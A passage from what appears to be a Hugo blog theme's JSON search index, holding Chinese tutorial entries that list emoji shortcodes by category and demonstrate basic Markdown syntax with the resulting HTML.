支持","uri":"/20150902/"},{"categories":["教程"],"content":"奖杯与奖牌 图标 代码 图标 代码 🎖️ medal_military 🏆 trophy 🏅 medal_sports 🥇 1st_place_medal 🥈 2nd_place_medal 🥉 3rd_place_medal ","date":"2015-09-02","objectID":"/20150902/:6:2","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"体育运动 图标 代码 图标 代码 ⚽ soccer ⚾ baseball 🏀 basketball 🏐 volleyball 🏈 football 🏉 rugby_football 🎾 tennis 🎳 bowling 🦗 cricket 🏑 field_hockey 🏒 ice_hockey 🏓 ping_pong 🏸 badminton 🥊 boxing_glove 🥋 martial_arts_uniform 🥅 goal_net ⛳ golf ⛸️ ice_skate 🎣 fishing_pole_and_fish 🎽 running_shirt_with_sash 🎿 ski ","date":"2015-09-02","objectID":"/20150902/:6:3","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"游戏 图标 代码 图标 代码 🎯 dart 🎱 8ball 🔮 crystal_ball 🎮 video_game 🕹️ joystick 🎰 slot_machine 🎲 game_die ♠️ spades ♥️ hearts ♦️ diamonds ♣️ clubs 🃏 black_joker 🀄 mahjong 🎴 flower_playing_cards ","date":"2015-09-02","objectID":"/20150902/:6:4","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"艺术与工艺 图标 代码 图标 代码 🎭 performing_arts 🖼 framed_picture 🎨 art ","date":"2015-09-02","objectID":"/20150902/:6:5","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"物品 ","date":"2015-09-02","objectID":"/20150902/:7:0","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"服装 图标 代码 图标 代码 👓 eyeglasses 🕶️ dark_sunglasses 👔 necktie 👕 shirt tshirt 👖 jeans 👗 dress 👘 kimono 👙 bikini 👚 womans_clothes 👛 purse 👜 handbag 👝 pouch 🛍️ shopping 🎒 school_satchel 👞 mans_shoe shoe 👟 athletic_shoe 👠 high_heel 👡 sandal 👢 boot 👑 crown 👒 womans_hat 🎩 tophat 🎓 mortar_board ⛑️ rescue_worker_helmet 📿 prayer_beads 💄 lipstick 💍 ring 💎 gem ","date":"2015-09-02","objectID":"/20150902/:7:1","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"声音 图标 代码 图标 代码 🔇 mute 🔈 speaker 🔉 sound 🔊 loud_sound 📢 loudspeaker 📣 mega 📯 postal_horn 🔔 bell 🔕 no_bell ","date":"2015-09-02","objectID":"/20150902/:7:2","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"音乐 图标 代码 图标 代码 🎼 musical_score 🎵 musical_note 🎶 notes 🎙️ studio_microphone 🎚️ level_slider 🎛️ control_knobs 🎤 microphone 🎧 headphones 📻 radio ","date":"2015-09-02","objectID":"/20150902/:7:3","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"乐器 图标 代码 图标 代码 🎷 saxophone 🎸 guitar 🎹 musical_keyboard 🎺 trumpet 🎻 violin 🥁 drum ","date":"2015-09-02","objectID":"/20150902/:7:4","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"电话 图标 代码 图标 代码 📱 iphone 📲 calling ☎️ phone telephone 📞 telephone_receiver 📟 pager 📠 fax ","date":"2015-09-02","objectID":"/20150902/:7:5","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"电脑 图标 代码 图标 代码 🔋 battery 🔌 electric_plug 💻 computer 🖥️ desktop_computer 🖨️ printer ⌨️ keyboard 🖱 computer_mouse 🖲️ trackball 💽 minidisc 💾 floppy_disk 💿 cd 📀 dvd ","date":"2015-09-02","objectID":"/20150902/:7:6","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"灯光与影像 图标 代码 图标 代码 🎥 movie_camera 🎞️ film_strip 📽️ film_projector 🎬 clapper 📺 tv 📷 camera 📸 camera_flash 📹 video_camera 📼 vhs 🔍 mag 🔎 mag_right 🕯️ candle 💡 bulb 🔦 flashlight 🏮 izakaya_lantern lantern ","date":"2015-09-02","objectID":"/20150902/:7:7","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"书与纸张 图标 代码 图标 代码 📔 notebook_with_decorative_cover 📕 closed_book 📖 book open_book 📗 green_book 📘 blue_book 📙 orange_book 📚 books 📓 notebook 📒 ledger 📃 page_with_curl 📜 scroll 📄 page_facing_up 📰 newspaper 🗞️ newspaper_roll 📑 bookmark_tabs 🔖 bookmark 🏷️ label ","date":"2015-09-02","objectID":"/20150902/:7:8","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"钱 图标 代码 图标 代码 💰 moneybag 💴 yen 💵 dollar 💶 euro 💷 pound 💸 money_with_wings 💳 credit_card 💹 chart ","date":"2015-09-02","objectID":"/20150902/:7:9","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"邮件 图标 代码 图标 代码 ✉️ email envelope 📧 📧 📨 incoming_envelope 📩 envelope_with_arrow 📤 outbox_tray 📥 inbox_tray 📦 package 📫 mailbox 📪 mailbox_closed 📬 mailbox_with_mail 📭 mailbox_with_no_mail 📮 postbox 🗳 ballot_box ","date":"2015-09-02","objectID":"/20150902/:7:10","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"书写 图标 代码 图标 代码 ✏️ pencil2 ✒️ black_nib 🖋 fountain_pen 🖊 pen 🖌 paintbrush 🖍 crayon 📝 memo pencil ","date":"2015-09-02","objectID":"/20150902/:7:11","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"办公 图标 代码 图标 代码 💼 briefcase 📁 file_folder 📂 open_file_folder 🗂️ card_index_dividers 📅 date 📆 calendar 🗒 spiral_notepad 🗓 spiral_calendar 📇 card_index 📈 chart_with_upwards_trend 📉 chart_with_downwards_trend 📊 bar_chart 📋 clipboard 📌 pushpin 📍 round_pushpin 📎 paperclip 🖇 paperclips 📏 straight_ruler 📐 triangular_ruler ✂️ scissors 🗃️ card_file_box 🗄️ file_cabinet 🗑️ wastebasket ","date":"2015-09-02","objectID":"/20150902/:7:12","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"锁 图标 代码 图标 代码 🔒 lock 🔓 unlock 🔏 lock_with_ink_pen 🔐 closed_lock_with_key 🔑 key 🗝️ old_key ","date":"2015-09-02","objectID":"/20150902/:7:13","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"工具 图标 代码 图标 代码 🔨 hammer ⛏️ pick ⚒️ hammer_and_pick 🛠️ hammer_and_wrench 🗡 dagger ⚔️ crossed_swords 🔫 gun 🏹 bow_and_arrow 🛡️ shield 🔧 wrench 🔩 nut_and_bolt ⚙️ gear 🗜 clamp ⚖ balance_scale 🔗 link ⛓️ chains ","date":"2015-09-02","objectID":"/20150902/:7:14","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"科学 图标 代码 图标 代码 ⚗️ alembic 🔬 microscope 🔭 telescope 🛰️ satellite ","date":"2015-09-02","objectID":"/20150902/:7:15","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"医疗 图标 代码 图标 代码 💉 syringe 💊 pill ","date":"2015-09-02","objectID":"/20150902/:7:16","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"生活用品 图标 代码 图标 代码 🚪 door 🛏️ bed 🛋️ couch_and_lamp 🚽 toilet 🚿 shower 🛁 bathtub 🛒 shopping_cart ","date":"2015-09-02","objectID":"/20150902/:7:17","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"其它物品 图标 代码 图标 代码 🚬 smoking ⚰️ coffin ⚱️ funeral_urn 🗿 moyai ","date":"2015-09-02","objectID":"/20150902/:7:18","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"符号 ","date":"2015-09-02","objectID":"/20150902/:8:0","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"交通标识 图标 代码 图标 代码 🏧 atm 🚮 put_litter_in_its_place 🚰 potable_water ♿ wheelchair 🚹 mens 🚺 womens 🚻 restroom 🚼 baby_symbol 🚾 wc 🛂 passport_control 🛃 customs 🛄 baggage_claim 🛅 left_luggage ","date":"2015-09-02","objectID":"/20150902/:8:1","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"警告 图标 代码 图标 代码 ⚠️ warning 🚸 children_crossing ⛔ no_entry 🚫 no_entry_sign 🚳 no_bicycles 🚭 no_smoking 🚯 do_not_litter 🚱 🚱 🚷 no_pedestrians 📵 no_mobile_phones 🔞 underage ☢ radioactive ☣ biohazard ","date":"2015-09-02","objectID":"/20150902/:8:2","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"箭头 图标 代码 图标 代码 ⬆️ arrow_up ↗️ arrow_upper_right ➡️ arrow_right ↘️ arrow_lower_right ⬇️ arrow_down ↙️ arrow_lower_left ⬅️ arrow_left ↖️ arrow_upper_left ↕️ arrow_up_down ↔️ left_right_arrow ↩️ leftwards_arrow_with_hook ↪️ arrow_right_hook ⤴️ arrow_heading_up ⤵️ arrow_heading_down 🔃 arrows_clockwise 🔄 arrows_counterclockwise 🔙 back 🔚 end 🔛 on 🔜 soon 🔝 top ","date":"2015-09-02","objectID":"/20150902/:8:3","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"宗教 图标 代码 图标 代码 🛐 place_of_worship ⚛️ atom_symbol 🕉 om ✡️ star_of_david ☸️ wheel_of_dharma ☯️ yin_yang ✝️ latin_cross ☦️ orthodox_cross ☪️ star_and_crescent ☮️ peace_symbol 🕎 menorah 🔯 six_pointed_star ","date":"2015-09-02","objectID":"/20150902/:8:4","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"生肖 图标 代码 图标 代码 ♈ aries ♉ taurus ♊ gemini ♋ cancer ♌ leo ♍ virgo ♎ libra ♏ scorpius ♐ sagittarius ♑ capricorn ♒ aquarius ♓ pisces ⛎ ophiuchus ","date":"2015-09-02","objectID":"/20150902/:8:5","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"影像符号 图标 代码 图标 代码 🔀 twisted_rightwards_arrows 🔁 repeat 🔂 repeat_one ▶️ arrow_forward ⏩ fast_forward ⏭ next_track_button ⏯ play_or_pause_button ◀️ arrow_backward ⏪ rewind ⏮️ previous_track_button 🔼 arrow_up_small ⏫ arrow_double_up 🔽 arrow_down_small ⏬ arrow_double_down ⏸ pause_button ⏹ stop_button ⏺ record_button 🎦 cinema 🔅 low_brightness 🔆 high_brightness 📶 signal_strength 📳 vibration_mode 📴 mobile_phone_off ","date":"2015-09-02","objectID":"/20150902/:8:6","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"数学 图标 代码 图标 代码 ✖️ heavy_multiplication_x ➕ heavy_plus_sign ➖ heavy_minus_sign ➗ heavy_division_sign ","date":"2015-09-02","objectID":"/20150902/:8:7","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"标点符号 图标 代码 图标 代码 ‼️ bangbang ⁉️ interrobang ❓ question ❔ grey_question ❕ grey_exclamation ❗ exclamation heavy_exclamation_mark 〰️ wavy_dash ","date":"2015-09-02","objectID":"/20150902/:8:8","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"货币 图标 代码 图标 代码 💱 currency_exchange 💲 heavy_dollar_sign ","date":"2015-09-02","objectID":"/20150902/:8:9","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"按键符号 图标 代码 图标 代码 #️⃣ hash *️⃣ asterisk 0️⃣ zero 1️⃣ one 2️⃣ two 3️⃣ three 4️⃣ four 5️⃣ five 6️⃣ six 7️⃣ seven 8️⃣ eight 9️⃣ nine 🔟 keycap_ten ","date":"2015-09-02","objectID":"/20150902/:8:10","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"字母符号 图标 代码 图标 代码 🔠 capital_abcd 🔡 abcd 🔢 1234 🔣 symbols 🔤 abc 🅰️ a 🆎 ab 🅱️ b 🆑 cl 🆒 cool 🆓 free ℹ️ information_source 🆔 id ⓜ️ m 🆕 new 🆖 ng 🅾️ o2 🆗 ok 🅿️ parking 🆘 sos 🆙 up 🆚 vs 🈁 koko 🈂️ sa 🈷️ u6708 🈶 u6709 🈯 u6307 🉐 ideograph_advantage 🈹 u5272 🈚 u7121 🈲 u7981 🉑 accept 🈸 u7533 🈴 u5408 🈳 u7a7a ㊗️ congratulations ㊙️ secret 🈺 u55b6 🈵 u6e80 ","date":"2015-09-02","objectID":"/20150902/:8:11","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"几何符号 图标 代码 图标 代码 🔴 red_circle 🔵 large_blue_circle ⚫ black_circle ⚪ white_circle ⬛ black_large_square ⬜ white_large_square ◼️ black_medium_square ◻️ white_medium_square ◾ black_medium_small_square ◽ white_medium_small_square ▪️ black_small_square ▫️ white_small_square 🔶 large_orange_diamond 🔷 large_blue_diamond 🔸 small_orange_diamond 🔹 small_blue_diamond 🔺 small_red_triangle 🔻 small_red_triangle_down 💠 diamond_shape_with_a_dot_inside 🔘 radio_button 🔳 white_square_button 🔲 black_square_button ","date":"2015-09-02","objectID":"/20150902/:8:12","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"其它符合 图标 代码 图标 代码 ♻️ recycle ⚜️ fleur_de_lis 🔱 trident 📛 name_badge 🔰 beginner ⭕ o ✅ white_check_mark ☑️ ballot_box_with_check ✔️ heavy_check_mark ❌ x ❎ negative_squared_cross_mark ➰ curly_loop ➿ loop 〽️ part_alternation_mark ✳️ eight_spoked_asterisk ✴️ eight_pointed_black_star ❇️ sparkle ©️ copyright ®️ registered ™️ tm ","date":"2015-09-02","objectID":"/20150902/:8:13","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"旗帜 ","date":"2015-09-02","objectID":"/20150902/:9:0","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"常用旗帜 图标 代码 图标 代码 🏁 checkered_flag 🚩 triangular_flag_on_post 🎌 crossed_flags 🏴 black_flag 🏳 white_flag 🏳️‍🌈 rainbow_flag ","date":"2015-09-02","objectID":"/20150902/:9:1","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"国家和地区旗帜 图标 代码 图标 代码 🇦🇩 andorra 🇦🇪 united_arab_emirates 🇦🇫 afghanistan 🇦🇬 antigua_barbuda 🇦🇮 anguilla 🇦🇱 albania 🇦🇲 armenia 🇦🇴 angola 🇦🇶 antarctica 🇦🇷 argentina 🇦🇸 american_samoa 🇦🇹 austria 🇦🇺 australia 🇦🇼 aruba 🇦🇽 aland_islands 🇦🇿 azerbaijan 🇧🇦 bosnia_herzegovina 🇧🇧 barbados 🇧🇩 bangladesh 🇧🇪 belgium 🇧🇫 burkina_faso 🇧🇬 bulgaria 🇧🇭 bahrain 🇧🇮 burundi 🇧🇯 benin 🇧🇱 st_barthelemy 🇧🇲 bermuda 🇧🇳 brunei 🇧🇴 bolivia 🇧🇶 caribbean_netherlands 🇧🇷 brazil 🇧🇸 bahamas 🇧🇹 bhutan 🇧🇼 botswana 🇧🇾 belarus 🇧🇿 belize 🇨🇦 canada 🇨🇨 cocos_islands 🇨🇩 congo_kinshasa 🇨🇫 central_african_republic 🇨🇬 congo_brazzaville 🇨🇭 switzerland 🇨🇮 cote_divoire 🇨🇰 cook_islands 🇨🇱 chile 🇨🇲 cameroon 🇨🇳 cn 🇨🇴 colombia 🇨🇷 costa_rica 🇨🇺 cuba 🇨🇻 cape_verde 🇨🇼 curacao 🇨🇽 christmas_island 🇨🇾 cyprus 🇨🇿 czech_republic 🇩🇪 de 🇩🇯 djibouti 🇩🇰 denmark 🇩🇲 dominica 🇩🇴 dominican_republic 🇩🇿 algeria 🇪🇨 ecuador 🇪🇪 estonia 🇪🇬 egypt 🇪🇭 western_sahara 🇪🇷 eritrea 🇪🇸 es 🇪🇹 ethiopia 🇪🇺 eu european_union 🇫🇮 finland 🇫🇯 fiji 🇫🇰 falkland_islands 🇫🇲 micronesia 🇫🇴 faroe_islands 🇫🇷 fr 🇬🇦 gabon 🇬🇧 gb uk 🇬🇩 grenada 🇬🇪 georgia 🇬🇫 french_guiana 🇬🇬 guernsey 🇬🇭 ghana 🇬🇮 gibraltar 🇬🇱 greenland 🇬🇲 gambia 🇬🇳 guinea 🇬🇵 guadeloupe 🇬🇶 equatorial_guinea 🇬🇷 greece 🇬🇸 south_georgia_south_sandwich_islands 🇬🇹 guatemala 🇬🇺 guam 🇬🇼 guinea_bissau 🇬🇾 guyana 🇭🇰 hong_kong 🇭🇳 honduras 🇭🇷 croatia 🇭🇹 haiti 🇭🇺 hungary 🇮🇨 canary_islands 🇮🇩 indonesia 🇮🇪 ireland 🇮🇱 israel 🇮🇲 isle_of_man 🇮🇳 india 🇮🇴 british_indian_ocean_territory 🇮🇶 iraq 🇮🇷 iran 🇮🇸 iceland 🇮🇹 it 🇯🇪 jersey 🇯🇲 jamaica 🇯🇴 jordan 🇯🇵 jp 🇰🇪 kenya 🇰🇬 kyrgyzstan 🇰🇭 cambodia 🇰🇮 kiribati 🇰🇲 comoros 🇰🇳 st_kitts_nevis 🇰🇵 north_korea 🇰🇷 kr 🇰🇼 kuwait 🇰🇾 cayman_islands 🇰🇿 kazakhstan 🇱🇦 laos 🇱🇧 lebanon 🇱🇨 st_lucia 🇱🇮 liechtenstein 🇱🇰 sri_lanka 🇱🇷 liberia 🇱🇸 lesotho 🇱🇹 lithuania 🇱🇺 luxembourg 🇱🇻 latvia 🇱🇾 libya 🇲🇦 morocco 🇲🇨 monaco 🇲🇩 moldova 🇲🇪 montenegro 🇲🇬 madagascar 🇲🇭 marshall_islands 🇲🇰 macedonia 🇲🇱 mali 🇲🇲 myanmar 🇲🇳 mongolia 🇲🇴 macau 🇲🇵 northern_mariana_islands 🇲🇶 martinique 🇲🇷 mauritania 🇲🇸 montserrat 🇲🇹 malta 🇲🇺 mauritius 🇲🇻 maldives 🇲🇼 malawi 🇲🇽 mexico 🇲🇾 malaysia 🇲🇿 mozambique 🇳🇦 namibia 🇳🇨 new_caledonia 🇳🇪 niger 🇳🇫 norfolk_island 🇳🇬 nigeria 🇳🇮 nicaragua 🇳🇱 netherlands 🇳🇴 norway 🇳🇵 nepal 🇳🇷 nauru 🇳🇺 niue 🇳🇿 new_zealand 🇴🇲 oman 🇵🇦 panama 🇵🇪 peru 🇵🇫 french_polynesia 🇵🇬 papua_new_guinea 🇵🇭 philippines 🇵🇰 pakistan 🇵🇱 poland 🇵🇲 st_pierre_miquelon 🇵🇳 pitcairn_islands 🇵🇷 puerto_rico 🇵🇸 palestinian_territories 🇵🇹 portugal 🇵🇼 palau 🇵🇾 paraguay 🇶🇦 qatar 🇷🇪 reunion 🇷🇴 romania 🇷🇸 serbia 🇷🇺 ru 🇷🇼 rwanda 🇸🇦 saudi_arabia 🇸🇧 solomon_islands 🇸🇨 seychelles 🇸🇩 sudan 🇸🇪 sweden 🇸🇬 singapore 🇸🇭 st_helena 🇸🇮 slovenia 🇸🇰 slovakia 🇸🇱 sierra_leone 🇸🇲 san_marino 🇸🇳 senegal 🇸🇴 somalia 🇸🇷 suriname 🇸🇸 south_sudan 🇸🇹 sao_tome_principe 🇸🇻 el_salvador 🇸🇽 sint_maarten 🇸🇾 syria 🇸🇿 swaziland 🇹🇨 turks_caicos_islands 🇹🇩 chad 🇹🇫 french_southern_territories 🇹🇬 togo 🇹🇭 thailand 🇹🇯 tajikistan 🇹🇰 tokelau 🇹🇱 timor_leste 🇹🇲 turkmenistan 🇹🇳 tunisia 🇹🇴 tonga 🇹🇷 tr 🇹🇹 trinidad_tobago 🇹🇻 tuvalu 🇹🇼 taiwan 🇹🇿 tanzania 🇺🇦 ukraine 🇺🇬 uganda 🇺🇸 u","date":"2015-09-02","objectID":"/20150902/:9:2","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"Markdown 基本语法 这篇文章提供了可以在 Hugo 的文章中使用的基本 Markdown 语法示例. 注意 这篇文章借鉴了一篇很棒的来自 Grav 的文章. 如果你想了解 Loveit 主题的扩展 Markdown 语法, 请阅读扩展 Markdown 语法页面. 事实上, 编写 Web 内容很麻烦. WYSIWYG所见即所得 编辑器帮助减轻了这一任务. 但通常会导致代码太糟, 或更糟糕的是, 网页也会很丑. 没有通常伴随的所有复杂和丑陋的问题, Markdown 是一种更好的生成 HTML 内容的方式. 一些主要好处是: Markdown 简单易学, 几乎没有多余的字符, 因此编写内容也更快. 用 Markdown 书写时出错的机会更少. 可以产生有效的 XHTML 输出. 将内容和视觉显示保持分开, 这样就不会打乱网站的外观. 可以在你喜欢的任何文本编辑器或 Markdown 应用程序中编写内容. Markdown 使用起来很有趣! John Gruber, Markdown 的作者如是说: Markdown 格式的首要设计目标是更具可读性. 最初的想法是 Markdown 格式的文档应当以纯文本形式发布, 而不会看起来像被标签或格式说明所标记. 虽然 Markdown 的语法受到几种现有的文本到 HTML 转换工具的影响, 但 Markdown 语法的最大灵感来源是纯文本电子邮件的格式. – John Gruber 话不多说, 我们来回顾一下 Markdown 的主要语法以及生成的 HTML 样式! 技巧  将此页保存为书签，以备将来参考! ","date":"2015-09-01","objectID":"/20150901/:0:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"1 标题 从 h2 到 h6 的标题在每个级别上都加上一个 ＃: ## h2 标题 ### h3 标题 #### h4 标题 ##### h5 标题 ###### h6 标题 输出的 HTML 看起来像这样: \u003ch2\u003eh2 标题\u003c/h2\u003e \u003ch3\u003eh3 标题\u003c/h3\u003e \u003ch4\u003eh4 标题\u003c/h4\u003e \u003ch5\u003eh5 标题\u003c/h5\u003e \u003ch6\u003eh6 标题\u003c/h6\u003e 标题 ID 要添加自定义标题 ID, 请在与标题相同的行中将自定义 ID 放在花括号中: ### 一个很棒的标题 {#custom-id} 输出的 HTML 看起来像这样: \u003ch3 id=\"custom-id\"\u003e一个很棒的标题\u003c/h3\u003e ","date":"2015-09-01","objectID":"/20150901/:1:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"2 注释 注释是和 HTML 兼容的： \u003c!-- 这是一段注释 --\u003e 不能看到以下的注释: ","date":"2015-09-01","objectID":"/20150901/:2:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"3 水平线 HTML 中的 \u003chr\u003e 标签是用来在段落元素之间创建一个 “专题间隔” 的. 使用 Markdown, 你可以用以下方式创建一个 \u003chr\u003e 标签: ___: 三个连续的下划线 ---: 三个连续的破折号 ***: 三个连续的星号 呈现的输出效果如下: ","date":"2015-09-01","objectID":"/20150901/:3:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"4 段落 按照纯文本的方式书写段落, 纯文本在呈现的 HTML 中将用 \u003cp\u003e/\u003c/p\u003e 标签包裹. 如下段落: Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad. 输出的 HTML 看起来像这样: \u003cp\u003eLorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.\u003c/p\u003e 可以使用一个空白行进行换行. ","date":"2015-09-01","objectID":"/20150901/:4:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"5 内联 HTML 元素 如果你需要某个 HTML 标签 (带有一个类), 则可以简单地像这样使用: Markdown 格式的段落. \u003cdiv class=\"class\"\u003e 这是 \u003cb\u003eHTML\u003c/b\u003e \u003c/div\u003e Markdown 格式的段落. ","date":"2015-09-01","objectID":"/20150901/:5:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"6 强调 ","date":"2015-09-01","objectID":"/20150901/:6:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"加粗 用于强调带有较粗字体的文本片段. 以下文本片段会被 渲染为粗体. **渲染为粗体** __渲染为粗体__ 输出的 HTML 看起来像这样: \u003cstrong\u003e渲染为粗体\u003c/strong\u003e ","date":"2015-09-01","objectID":"/20150901/:6:1","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"斜体 用于强调带有斜体的文本片段. 以下文本片段被 渲染为斜体. *渲染为斜体* _渲染为斜体_ 输出的 HTML 看起来像这样: \u003cem\u003e渲染为斜体\u003c/em\u003e ","date":"2015-09-01","objectID":"/20150901/:6:2","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"删除线 按照 GFMGitHub flavored Markdown 你可以使用删除线. ~~这段文本带有删除线.~~ 呈现的输出效果如下: 这段文本带有删除线. 输出的 HTML 看起来像这样: \u003cdel\u003e这段文本带有删除线.\u003c/del\u003e ","date":"2015-09-01","objectID":"/20150901/:6:3","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"组合 加粗, 斜体, 和删除线可以 组合使用. ***加粗和斜体*** ~~**删除线和加粗**~~ ~~*删除线和斜体*~~ ~~***加粗, 斜体和删除线***~~ 呈现的输出效果如下: 加粗和斜体 删除线和加粗 删除线和斜体 加粗, 斜体和删除线 输出的 HTML 看起来像这样: \u003cem\u003e\u003cstrong\u003e加粗和斜体\u003c/strong\u003e\u003c/em\u003e \u003cdel\u003e\u003cstrong\u003e删除线和加粗\u003c/strong\u003e\u003c/del\u003e \u003cdel\u003e\u003cem\u003e删除线和斜体\u003c/em\u003e\u003c/del\u003e \u003cdel\u003e\u003cem\u003e\u003cstrong\u003e加粗, 斜体和删除线\u003c/strong\u003e\u003c/em\u003e\u003c/del\u003e ","date":"2015-09-01","objectID":"/20150901/:6:4","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"7 引用 用于在文档中引用其他来源的内容块. 在要引用的任何文本之前添加 \u003e: \u003e **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. 呈现的输出效果如下: Fusion Drive combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. 输出的 HTML 看起来像这样: \u003cblockquote\u003e \u003cp\u003e \u003cstrong\u003eFusion Drive\u003c/strong\u003e combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. \u003c/p\u003e \u003c/blockquote\u003e 引用也可以嵌套: \u003e Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi. \u003e\u003e Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam. 呈现的输出效果如下: Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi. Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam. ","date":"2015-09-01","objectID":"/20150901/:7:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"8 列表 ","date":"2015-09-01","objectID":"/20150901/:8:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"无序列表 一系列项的列表, 其中项的顺序没有明显关系. 你可以使用以下任何符号来表示无序列表中的项: * 一项内容 - 一项内容 + 一项内容 例如: * Lorem ipsum dolor sit amet * Consectetur adipiscing elit * Integer molestie lorem at massa * Facilisis in pretium nisl aliquet * Nulla volutpat aliquam velit * Phasellus iaculis neque * Purus sodales ultricies * Vestibulum laoreet porttitor sem * Ac tristique libero volutpat at * Faucibus porta lacus fringilla vel * Aenean sit amet erat nunc * Eget porttitor lorem 呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Phasellus iaculis neque Purus sodales ultricies Vestibulum laoreet porttitor sem Ac tristique libero volutpat at Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem 输出的 HTML 看起来像这样: \u003cul\u003e \u003cli\u003eLorem ipsum dolor sit amet\u003c/li\u003e \u003cli\u003eConsectetur adipiscing elit\u003c/li\u003e \u003cli\u003eInteger molestie lorem at massa\u003c/li\u003e \u003cli\u003eFacilisis in pretium nisl aliquet\u003c/li\u003e \u003cli\u003eNulla volutpat aliquam velit \u003cul\u003e \u003cli\u003ePhasellus iaculis neque\u003c/li\u003e 